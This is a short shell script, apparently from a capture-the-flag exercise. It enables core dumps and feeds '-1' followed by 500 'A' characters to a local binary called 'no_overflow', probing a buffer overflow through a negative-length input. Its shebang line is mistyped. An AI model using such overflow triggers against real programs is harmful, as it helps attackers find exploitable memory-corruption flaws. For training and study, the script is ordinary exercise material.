#1/bin/bash
ulimit -c unlimited
(echo -1; python -c "print 'A'*500";) | ./no_overflow
